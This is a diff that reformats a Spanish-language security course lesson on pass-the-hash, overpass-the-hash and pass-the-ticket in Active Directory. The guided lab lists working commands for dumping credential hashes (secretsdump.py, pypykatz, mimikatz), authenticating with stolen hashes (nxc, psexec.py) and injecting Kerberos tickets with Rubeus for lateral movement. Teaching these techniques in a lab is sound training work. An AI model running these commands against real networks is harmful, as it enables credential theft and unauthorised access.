@@ -51,19 +51,25 @@ Al finalizar, el alumno podrá:
 ## 🧪 Laboratorio guiado
 
 1. **Extrae hashes (con admin local).** En la máquina de origen del lab:
-   ```
+
+   ```text
    secretsdump.py lab.local/adminlocal:pass@10.10.10.20
    ```
+
    o `pypykatz lsa minidump lsass.dmp` sobre un volcado.
 2. **Pass-the-Hash con nxc:**
+
    ```bash
    nxc smb 10.10.10.30 -u Administrator -H <NTLM_HASH> --local-auth
    ```
+
    Autentícate sin conocer la contraseña.
 3. **Ejecución remota por PtH:**
+
    ```bash
    psexec.py -hashes :<NTLM_HASH> Administrator@10.10.10.30
    ```
+
 4. **Overpass-the-Hash con Rubeus:** `Rubeus.exe asktgt /user:svc /rc4:<HASH> /ptt` para obtener e inyectar un TGT.
 5. **Pass-the-Ticket:** exporta un TGT (`Rubeus dump` / `mimikatz sekurlsa::tickets /export`) e inyéctalo con `Rubeus.exe ptt /ticket:ticket.kirbi`.
 6. **Muévete lateralmente** hacia una tercera máquina usando el ticket inyectado (WinRM/SMB) y verifica el acceso.
@@ -106,10 +112,10 @@ Credential Guard, deshabilitar NTLM donde se pueda, tiering administrativo, LAPS
 
 ## 🔗 Referencias
 
-- The Hacker Recipes — *Pass-the-Hash / Pass-the-Ticket*. https://www.thehacker.recipes/ad/movement/
-- MITRE ATT&CK — *Use Alternate Authentication Material* (`T1550`). https://attack.mitre.org/techniques/T1550/
-- Impacket. https://github.com/fortra/impacket
-- Rubeus. https://github.com/GhostPack/Rubeus
+- The Hacker Recipes — *Pass-the-Hash / Pass-the-Ticket*. <https://www.thehacker.recipes/ad/movement/>
+- MITRE ATT&CK — *Use Alternate Authentication Material* (`T1550`). <https://attack.mitre.org/techniques/T1550/>
+- Impacket. <https://github.com/fortra/impacket>
+- Rubeus. <https://github.com/GhostPack/Rubeus>
 
 ## ➡️ Siguiente clase
 
